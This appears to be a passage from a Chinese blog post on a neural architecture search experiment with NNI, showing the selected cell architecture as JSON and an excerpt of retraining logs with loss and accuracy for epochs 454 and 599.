<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;normal_n2_p0&quot;</span>: <span class="string">&quot;sepconv5x5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n2_p1&quot;</span>: <span class="string">&quot;sepconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n2_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n2_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n2_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;normal_n3_p0&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n3_p1&quot;</span>: <span class="string">&quot;sepconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n3_p2&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n3_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n3_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n3_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;normal_n4_p0&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n4_p1&quot;</span>: <span class="string">&quot;sepconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n4_p2&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n4_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n4_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n4_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n4_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;normal_n5_p0&quot;</span>: <span class="string">&quot;dilconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n5_p1&quot;</span>: <span class="string">&quot;dilconv5x5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n5_p2&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n5_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n5_p4&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n5_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n5_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n5_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n2_p0&quot;</span>: <span class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n2_p1&quot;</span>: <span class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n2_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n2_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n2_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n3_p0&quot;</span>: <span class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n3_p1&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n3_p2&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n3_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n3_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n3_p2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p0&quot;</span>: <span class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p1&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p2&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n4_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n4_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n4_p2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p0&quot;</span>: <span class="string">&quot;avgpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p1&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p2&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p4&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n5_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n5_p2&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>retrain日志如下（仅截取第453个epoch和最后两个epoch）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line">[2021-02-22 16:16:01] INFO (nni&#x2F;MainThread) Epoch 453 LR 0.003524</span><br><span class="line">[2021-02-22 16:16:02] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 000&#x2F;520 Loss 0.146 Prec@(1,5) (94.8%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:04] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 010&#x2F;520 Loss 0.142 Prec@(1,5) (96.5%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:07] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 020&#x2F;520 Loss 0.151 Prec@(1,5) (96.5%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:10] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 030&#x2F;520 Loss 0.137 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:13] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 040&#x2F;520 Loss 0.147 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:15] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 050&#x2F;520 Loss 0.146 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:18] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 060&#x2F;520 Loss 0.144 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:21] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 070&#x2F;520 Loss 0.145 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 080&#x2F;520 Loss 0.144 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:26] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 090&#x2F;520 Loss 0.143 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:29] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 100&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:31] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 110&#x2F;520 Loss 0.139 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:34] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 120&#x2F;520 Loss 0.139 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:37] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 130&#x2F;520 Loss 0.138 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:40] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 140&#x2F;520 Loss 0.140 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:42] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 150&#x2F;520 Loss 0.139 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:45] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 160&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:48] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 170&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:50] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 180&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:53] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 190&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:56] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 200&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:59] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 210&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:01] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 220&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:04] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 230&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:07] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 240&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:09] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 250&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:12] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 260&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:15] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 270&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:17] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 280&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:20] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 290&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 300&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:26] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 310&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:28] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 320&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:31] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 330&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:34] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 340&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:36] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 350&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:39] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 360&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:42] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 370&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:45] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 380&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:47] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 390&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:50] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 400&#x2F;520 Loss 0.143 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:53] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 410&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:55] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 420&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:58] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 430&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:01] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 440&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:04] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 450&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:06] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 460&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:09] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 470&#x2F;520 Loss 0.144 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:12] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 480&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:14] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 490&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:17] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 500&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:20] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 510&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 520&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Final Prec@1 97.0640%</span><br><span class="line">...</span><br><span class="line">[2021-02-22 21:37:03] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 000&#x2F;520 Loss 0.054 Prec@(1,5) (99.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:05] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 010&#x2F;520 Loss 0.060 Prec@(1,5) (99.1%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 020&#x2F;520 Loss 0.058 Prec@(1,5) (99.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:10] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 030&#x2F;520 Loss 0.054 Prec@(1,5) (99.1%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:12] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 040&#x2F;520 Loss 0.059 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:15] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 050&#x2F;520 Loss 0.058 Prec@(1,5) (99.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:17] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 060&#x2F;520 Loss 0.064 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:20] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 070&#x2F;520 Loss 0.066 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:22] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 080&#x2F;520 Loss 0.068 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:24] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 090&#x2F;520 Loss 0.067 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:27] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 100&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:29] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 110&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:32] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 120&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:34] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 130&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:37] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 140&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:39] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 150&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:41] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 160&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:44] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 170&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:46] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 180&#x2F;520 Loss 0.072 Prec@(1,5) (98.6%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:49] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 190&#x2F;520 Loss 0.072 Prec@(1,5) (98.6%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:51] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 200&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:53] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 210&#x2F;520 Loss 0.072 Prec@(1,5) (98.6%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:56] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 220&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:58] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 230&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:01] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 240&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:03] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 250&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:06] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 260&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 270&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:10] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 280&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:13] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 290&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:15] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 300&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:18] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 310&#x2F;520 Loss 0.069 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:20] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 320&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:22] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 330&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:25] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 340&#x2F;520 Loss 0.069 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:27] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 350&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:30] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 360&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:32] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 370&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:34] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 380&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:37] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 390&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:39] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 400&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:42] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 410&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:44] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 420&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:47] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 430&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:49] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 440&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:51] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 450&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:54] INFO (nni&#x2F;MainThread) 